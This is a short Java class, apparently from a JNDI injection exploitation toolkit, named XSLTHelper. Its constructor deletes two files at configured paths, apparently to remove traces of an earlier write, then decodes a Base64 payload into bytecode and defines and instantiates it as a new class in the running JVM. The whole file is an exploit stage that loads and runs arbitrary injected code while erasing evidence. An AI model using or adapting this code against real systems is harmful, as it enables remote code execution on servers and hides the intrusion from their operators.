package map.jndi.template;

import org.springframework.cglib.core.ReflectUtils;

import java.io.File;
import java.util.Base64;

public class XSLTHelper {
    public static String xsltPath;
    public static String classPath;
    public static String className;
    public static String payload;

    public XSLTHelper() throws Exception {
        new File(xsltPath).delete();
        new File(classPath).delete();

        byte[] byteCode = Base64.getDecoder().decode(payload);
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        ReflectUtils.defineClass(className, byteCode, cl).newInstance();
    }
}
